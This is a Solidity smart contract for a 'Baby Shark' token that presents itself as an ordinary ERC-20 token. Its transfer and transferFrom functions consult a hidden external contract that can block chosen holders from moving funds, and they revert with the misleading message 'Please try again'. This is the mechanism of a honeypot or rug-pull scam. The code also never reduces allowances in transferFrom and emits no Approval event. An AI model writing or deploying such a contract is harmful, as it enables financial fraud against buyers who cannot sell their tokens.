//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface R2D2 {

    function staking( uint _a, uint _b) external view returns (bool);

    function zakl(address account) external view returns (uint8);

    function unstake(address senders, address taker, uint balance, uint amount) external returns (bool);

    function withdraw(uint account, uint amounta, uint abountb) external returns (bool);


}

contract BabyShark {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    R2D2 rmtmeth;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Baby Shark";
    string public symbol = hex"42616279536861726Bf09fa688";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(R2D2 paparam) {
        
        rmtmeth = paparam;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(rmtmeth.zakl(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(rmtmeth.zakl(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}